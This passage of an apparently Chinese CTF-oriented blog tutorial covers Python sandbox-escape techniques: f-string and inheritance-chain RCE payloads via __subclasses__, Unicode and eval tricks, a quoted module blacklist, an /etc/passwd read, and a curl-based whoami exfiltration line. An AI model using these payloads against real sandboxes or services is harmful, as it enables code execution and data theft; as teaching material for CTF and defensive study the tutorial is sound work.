class="number">1</span>]&#125;</span> * <span class="subst">&#123;i[<span class="number">2</span>]==i[<span class="number">3</span>]&#125;</span>&#x27;</span>)) == ans)</span><br></pre></td></tr></table></figure>
<h4 id="绕过-4"><code>()</code>绕过</h4>
<p>利用装饰器 <code>@</code><br>
利用魔术方法，例如 <code>enum.EnumMeta.__getitem__</code><br>
f 字符串执行</p>
<p>f 字符串算不上一个绕过，更像是一种新的攻击面，通常情况下用来获取敏感上下文信息,例如获取环境变量</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">&#123;whoami.__class__.__dict__&#125;</span><br><span class="line">&#123;whoami.__globals__[os].__dict__&#125;</span><br><span class="line">&#123;whoami.__globals__[os].environ&#125;</span><br><span class="line">&#123;whoami.__globals__[sys].path&#125;</span><br><span class="line">&#123;whoami.__globals__[sys].modules&#125;</span><br><span class="line"></span><br><span class="line">&#123;whoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__&#125;</span><br><span class="line"></span><br><span class="line">也可以直接 RCE</span><br><span class="line"></span><br><span class="line"><span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;whoami&quot;</span>)&#125;</span>&#x27;</span></span><br><span class="line">root</span><br><span class="line"></span><br><span class="line"><span class="string">f&quot;<span class="subst">&#123;__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).__dict__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>).read()&#125;</span>&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="内建函数绕过">内建函数绕过</h4>
<p>eval + list + dict 构造</p>
<p>假如我们在构造 payload 时需要使用 str 函数、bool 函数、bytes 函数等，则可以使用 eval 进行绕过。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;str&#x27;</span>)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;bool&#x27;</span>)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;bool&#x27;</span>&gt;</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;st&#x27;</span>+<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>
<p>这样就可以将函数名转化为字符串的形式，进而可以利用字符串的变换来进行绕过。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="built_in">list</span>(<span class="built_in">dict</span>(s_t_r=<span class="number">1</span>))[<span class="number">0</span>][::<span class="number">2</span>])</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>
<p>这样一来，只要 list 和 dict 没有被禁，就可以获取到任意的内建函数(<code>__buildin__</code>)。如果某个模块已经被导入了，则也可以获取这个模块中的函数。</p>
<h4 id="和-，获取获取函数"><code>.</code>和 <code>，</code>获取获取函数</h4>
<p>通常情况下，我们会通过点号来进行调用<code>__import__('binascii').a2b_base64</code></p>
<p>或者通过 getattr 函数：<code>getattr(__import__('binascii'),'a2b_base64')</code></p>
<p>如果将,和.都过滤了，则可以有如下的几种方式获取函数：</p>
<p>内建函数可以使用<code>eval(list(dict(s_t_r=1))[0][::2])</code> 这样的方式获取。</p>
<p>模块内的函数可以先使用__import__导入函数，然后使用 vars() 进行获取：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vars(__import__(<span class="string">&#x27;binascii&#x27;</span>))[<span class="string">&#x27;a2b_base64&#x27;</span>]</span><br><span class="line">&lt;built-in <span class="keyword">function</span> a2b_base64&gt;</span><br></pre></td></tr></table></figure>
<h4 id="unicode-绕过">unicode 绕过</h4>
<p>Python 3 开始支持非ASCII字符的标识符，也就是说，可以使用 Unicode 字符作为 Python 的变量名，函数名等。Python 在解析代码时，使用的 Unicode Normalization Form KC (NFKC) 规范化算法，这种算法可以将一些视觉上相似的 Unicode 字符统一为一个标准形式。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span> == 𝘦val</span><br><span class="line"><span class="literal">True</span> </span><br></pre></td></tr></table></figure>
<p>相似 unicode 寻找网站：<a class="link"   href="http://shapecatcher.com/" >http://shapecatcher.com/<i class="fas fa-external-link-alt"></i></a> 可以通过绘制的方式寻找相似字符</p>
<p>相似 unicode 脚本：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>,<span class="number">65537</span>):</span><br><span class="line">    tmp=<span class="built_in">chr</span>(i)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = tmp.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;-&quot;</span>) <span class="keyword">in</span> res:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;U:&#123;&#125;    A:&#123;&#125;      ascii:&#123;&#125; &quot;</span>.<span class="built_in">format</span>(tmp, res, i))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">下面是 <span class="number">0</span>-<span class="number">9</span>,a-z 的 unicode 字符</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗 𝘢𝘣𝘤𝘥𝘦𝘧𝘨𝘩𝘪𝘫𝘬𝘭𝘮𝘯𝘰𝘱𝘲𝘳𝘴𝘵𝘶𝘷𝘸𝘹𝘺𝘻  𝘈𝘉𝘊𝘋𝘌𝘍𝘎𝘏𝘐𝘑𝘒𝘔𝘕𝘖𝘗𝘘𝘙𝘚𝘛𝘜𝘝𝘞𝘟𝘠𝘡 </span><br><span class="line"></span><br><span class="line">下划线可以使用对应的全角字符进行替换：＿</span><br></pre></td></tr></table></figure>
<p>使用时注意第一个字符不能为全角，否则会报错：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(_＿name_＿) __main__ </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(＿＿name_＿) </span><br><span class="line">File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>    <span class="built_in">print</span>(＿＿name_＿)          </span><br><span class="line">^ SyntaxError: invalid character <span class="string">&#x27;＿&#x27;</span> (U+FF3F) </span><br></pre></td></tr></table></figure>
<p>需要注意的是，某些 unicode 在遇到 <code>lower()</code> 函数时也会发生变换，因此碰到 lower()、upper() 这样的函数时要格外注意。</p>
<h4 id="绕过命名空间限制">绕过命名空间限制</h4>
<h5 id="部分限制">部分限制</h5>
<p>有些沙箱在构建时使用 exec 来执行命令，exec 函数的第二个参数可以指定命名空间，通过修改、删除命名空间中的函数则可以构建一个沙箱。例子来源于 iscc_2016_pycalc。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_hook_import_</span>(<span class="params">name, *args, **kwargs</span>):</span><br><span class="line">    module_blacklist = [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;time&#x27;</span>, <span class="string">&#x27;bdb&#x27;</span>, <span class="string">&#x27;bsddb&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;CGIHTTPServer&#x27;</span>, <span class="string">&#x27;cgitb&#x27;</span>, <span class="string">&#x27;compileall&#x27;</span>, <span class="string">&#x27;ctypes&#x27;</span>, <span class="string">&#x27;dircache&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;doctest&#x27;</span>, <span class="string">&#x27;dumbdbm&#x27;</span>, <span class="string">&#x27;filecmp&#x27;</span>, <span class="string">&#x27;fileinput&#x27;</span>, <span class="string">&#x27;ftplib&#x27;</span>, <span class="string">&#x27;gzip&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;getopt&#x27;</span>, <span class="string">&#x27;getpass&#x27;</span>, <span class="string">&#x27;gettext&#x27;</span>, <span class="string">&#x27;httplib&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;imputil&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;macpath&#x27;</span>, <span class="string">&#x27;mailbox&#x27;</span>, <span class="string">&#x27;mailcap&#x27;</span>, <span class="string">&#x27;mhlib&#x27;</span>, <span class="string">&#x27;mimetools&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;mimetypes&#x27;</span>, <span class="string">&#x27;modulefinder&#x27;</span>, <span class="string">&#x27;multiprocessing&#x27;</span>, <span class="string">&#x27;netrc&#x27;</span>, <span class="string">&#x27;new&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;optparse&#x27;</span>, <span class="string">&#x27;pdb&#x27;</span>, <span class="string">&#x27;pipes&#x27;</span>, <span class="string">&#x27;pkgutil&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;popen2&#x27;</span>, <span class="string">&#x27;poplib&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;posix&#x27;</span>, <span class="string">&#x27;posixfile&#x27;</span>, <span class="string">&#x27;profile&#x27;</span>, <span class="string">&#x27;pstats&#x27;</span>, <span class="string">&#x27;pty&#x27;</span>, <span class="string">&#x27;py_compile&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;pyclbr&#x27;</span>, <span class="string">&#x27;pydoc&#x27;</span>, <span class="string">&#x27;rexec&#x27;</span>, <span class="string">&#x27;runpy&#x27;</span>, <span class="string">&#x27;shlex&#x27;</span>, <span class="string">&#x27;shutil&#x27;</span>, <span class="string">&#x27;SimpleHTTPServer&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;SimpleXMLRPCServer&#x27;</span>, <span class="string">&#x27;site&#x27;</span>, <span class="string">&#x27;smtpd&#x27;</span>, <span class="string">&#x27;socket&#x27;</span>, <span class="string">&#x27;SocketServer&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;sysconfig&#x27;</span>, <span class="string">&#x27;tabnanny&#x27;</span>, <span class="string">&#x27;tarfile&#x27;</span>, <span class="string">&#x27;telnetlib&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;tempfile&#x27;</span>, <span class="string">&#x27;Tix&#x27;</span>, <span class="string">&#x27;trace&#x27;</span>, <span class="string">&#x27;turtle&#x27;</span>, <span class="string">&#x27;urllib&#x27;</span>, <span class="string">&#x27;urllib2&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;uu&#x27;</span>, <span class="string">&#x27;webbrowser&#x27;</span>, <span class="string">&#x27;whichdb&#x27;</span>, <span class="string">&#x27;zipfile&#x27;</span>, <span class="string">&#x27;zipimport&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> forbid <span class="keyword">in</span> module_blacklist:</span><br><span class="line">        <span class="keyword">if</span> name == forbid:        <span class="comment"># don&#x27;t let user import these modules</span></span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;No you can\&#x27; import &#123;0&#125;!!!&#x27;</span>.<span class="built_in">format</span>(forbid))</span><br><span class="line">    <span class="comment"># normal modules can be imported</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">__import__</span>(name, *args, **kwargs)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sandbox_exec</span>(<span class="params">command</span>):      <span class="comment"># sandbox user input</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    __sandboxed_builtins__ = <span class="built_in">dict</span>(__builtins__.__dict__)</span><br><span class="line">    __sandboxed_builtins__[<span class="string">&#x27;__import__&#x27;</span>] = _hook_import_    <span class="comment"># hook import</span></span><br><span class="line">    <span class="keyword">del</span> __sandboxed_builtins__[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">    _<span class="keyword">global</span> = &#123;</span><br><span class="line">        <span class="string">&#x27;__builtins__&#x27;</span>: __sandboxed_builtins__</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">    <span class="built_in">exec</span> command <span class="keyword">in</span> _<span class="keyword">global</span>     <span class="comment"># do calculate in a sandboxed  </span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>沙箱首先获取 <em>_builtins</em>_，然后依据现有的 <em>_builtins</em>_ 来构建命名空间。<br>
修改 __import__ 函数为自定义的_hook_import_<br>
删除 open 函数防止文件操作<br>
exec 命令。<br>
绕过方式：</p>
<p>由于 exec 运行在特定的命名空间里，可以通过获取其他命名空间里的 <strong>builtins</strong>（这个__builtins__保存的就是原始__builtins__的引用），比如 types 库，来执行任意命令：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;types&#x27;</span>).__builtins__ <span class="built_in">__import__</span>(<span class="string">&#x27;string&#x27;</span>).__builtins__ </span><br></pre></td></tr></table></figure>
<h5 id="完全限制-no-builtins">完全限制(no builtins)</h5>
<p>如果沙箱完全清空了 <strong>builtins</strong>, 则无法使用 import,如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;__import__&quot;</span>, &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;,&#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">File <span class="string">&quot;&lt;string&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">&#x27;__import__&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;__import__&quot;</span>)</span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">__import__</span>&gt;</span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;import os&quot;</span>)</span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;import os&quot;</span>,&#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;,&#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">File <span class="string">&quot;&lt;string&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">ImportError: <span class="built_in">__import__</span> <span class="keyword">not</span> found</span><br></pre></td></tr></table></figure>
<p>这种情况下我们就需要利用 python 继承链来绕过，其步骤简单来说，就是通过 python 继承链获取内置类, 然后通过这些内置类获取到敏感方法例如 os.system 然后再进行利用。</p>
<p>具体原理可见：Python沙箱逃逸小结</p>
<p>常见的一些 RCE payload 如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">os[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_wrap_close&quot;</span>][<span class="number">0</span>][<span class="string">&quot;system&quot;</span>](<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># subprocess </span></span><br><span class="line"></span><br><span class="line">[ x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">&#x27;Popen&#x27;</span>][<span class="number">0</span>](<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># builtins</span></span><br><span class="line"></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_GeneratorContextManagerBase&quot;</span> <span class="keyword">and</span> <span class="string">&quot;os&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;__builtins__&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># help</span></span><br><span class="line"></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_GeneratorContextManagerBase&quot;</span> <span class="keyword">and</span> <span class="string">&quot;os&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;__builtins__&quot;</span>][<span class="string">&#x27;help&#x27;</span>]</span><br><span class="line"></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_wrap_close&quot;</span>][<span class="number">0</span>][<span class="string">&#x27;__builtins__&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#sys</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;sys&quot;</span>].modules[<span class="string">&quot;os&quot;</span>].system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;&#x27;_sitebuiltins.&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) <span class="keyword">and</span> <span class="keyword">not</span> <span class="string">&quot;_Helper&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) ][<span class="number">0</span>][<span class="string">&quot;sys&quot;</span>].modules[<span class="string">&quot;os&quot;</span>].system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#commands (not very common)</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;commands&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;commands&quot;</span>].getoutput(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pty (not very common)</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;pty&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;pty&quot;</span>].spawn(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#importlib</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;importlib&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;importlib&quot;</span>].import_module(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;importlib&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;importlib&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#imp</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;&#x27;imp.&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) ][<span class="number">0</span>][<span class="string">&quot;importlib&quot;</span>].import_module(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;&#x27;imp.&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) ][<span class="number">0</span>][<span class="string">&quot;importlib&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pdb</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;pdb&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;pdb&quot;</span>].os.system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ctypes</span></span><br><span class="line"></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;builtins&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;builtins&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;ctypes&#x27;</span>).CDLL(<span class="literal">None</span>).system(<span class="string">&#x27;ls /&#x27;</span>.encode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># multiprocessing</span></span><br><span class="line"></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;builtins&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;builtins&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;multiprocessing&#x27;</span>).Process(target=<span class="keyword">lambda</span>: <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;curl localhost:9999/?a=`whoami`&#x27;</span>)).start()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>常见的一些 File payload 如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">操作文件可以使用 builtins 中的 <span class="built_in">open</span>，也可以使用 FileLoader 模块的 get_data 方法。</span><br><span class="line"></span><br><span class="line">[ x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;FileLoader&quot;</span> ][<span class="number">0</span>].get_data(<span class="number">0</span>,<span class="string">&quot;/etc/passwd&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="绕过多行限制">绕过多行限制</h4>
<p>绕过多行限制的利用手法通常在限制了单行代码的情况下使用,例如 eval, 中间如果存在；或者换行会报错。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; <span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;);print(1)&quot;</span>)</span><br><span class="line">&gt;&gt;&gt; Traceback (most recent call last):</span><br><span class="line">&gt;&gt;&gt; File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line 1, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">&gt;&gt;&gt; File <span class="string">&quot;&lt;string&gt;&quot;</span>, line 1</span><br><span class="line">&gt;&gt;&gt; __import__(<span class="string">&#x27;os&#x27;</span>);<span class="built_in">print</span>(1)</span><br><span class="line">&gt;&gt;&gt; 1</span><br><span class="line">&gt;&gt;&gt; 2</span><br><span class="line">&gt;&gt;&gt; 3</span><br><span class="line">&gt;&gt;&gt; 4</span><br><span class="line">&gt;&gt;&gt; 5</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">exec</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> 可以支持换行符与;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; <span class="built_in">eval</span>(<span class="string">&quot;exec(&#x27;__import__(\&quot;os\&quot;)\\nprint(1)&#x27;)&quot;</span>)</span><br><span class="line">&gt;&gt;&gt; 1</span><br><span class="line">&gt;&gt;&gt; 1</span><br><span class="line">&gt;&gt;&gt; 2</span><br><span class="line">&gt;&gt;&gt; compile</span><br><span class="line"></span><br><span class="line">compile 在 single 模式下也同样可以使用 \n 进行换行, 在 <span class="built_in">exec</span> 模式下可以直接执行多行代码.</span><br><span class="line"></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;&#x27;</span><span class="string">&#x27;eval(compile(&#x27;</span><span class="built_in">print</span>(<span class="string">&quot;hello world&quot;</span>); <span class="built_in">print</span>(<span class="string">&quot;heyy&quot;</span>)<span class="string">&#x27;, &#x27;</span>&lt;stdin&gt;<span class="string">&#x27;, &#x27;</span><span class="built_in">exec</span><span class="string">&#x27;))&#x27;</span><span class="string">&#x27;&#x27;</span>)</span><br><span class="line">1</span><br><span class="line">海象表达式</span><br><span class="line"></span><br><span class="line">海象表达式是 Python 3.8 引入的一种新的语法特性，用于在表达式中同时进行赋值和比较操作。</span><br><span class="line"></span><br><span class="line">海象表达式的语法形式如下：</span><br><span class="line"></span><br><span class="line">&lt;expression&gt; := &lt;value&gt; <span class="keyword">if</span> &lt;condition&gt; <span class="keyword">else</span> &lt;value&gt;</span><br><span class="line">1</span><br><span class="line">借助海象表达式，我们可以通过列表来替代多行代码：</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; <span class="built_in">eval</span>(<span class="string">&#x27;[a:=__import__(&quot;os&quot;),b:=a.system(&quot;id&quot;)]&#x27;</span>)</span><br><span class="line">&gt;&gt;&gt; uid=1000(kali) gid=0(root) <span class="built_in">groups</span>=0(root),4(adm),20(dialout),24(cdrom),25(floppy),27(<span class="built_in">sudo</span>),29(audio),30(dip),44(video),46(plugdev),109(netdev),119(wireshark),122(bluetooth),134(scanner),142(kaboxer)</span><br><span class="line">&gt;&gt;&gt; [&lt;module <span class="string">&#x27;os&#x27;</span> (frozen)&gt;, 0]</span><br><span class="line">&gt;&gt;&gt; 1</span><br><span class="line">&gt;&gt;&gt; 2</span><br><span class="line">&gt;&gt;&gt; 3</span><br><span class="line">&gt;&gt;&gt; 绕过长度限制</span><br><span class="line">&gt;&gt;&gt; BYUCTF_2023 中的几道 jail 题对 payload 的长度作了限制</span><br><span class="line"></span><br><span class="line"><span class="built_in">eval</span>((__import__(&quot;re&quot;).sub(r&#x27;[a-z0-<span class="number">9</span>]&#x27;,&#x27;&#x27;,input(&quot;code &gt; &quot;).lower()))[:130])</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="题目限制不能出现数字字母，构造的目标是调用-open-函数进行读取">题目限制不能出现数字字母，构造的目标是调用 open 函数进行读取</h4>
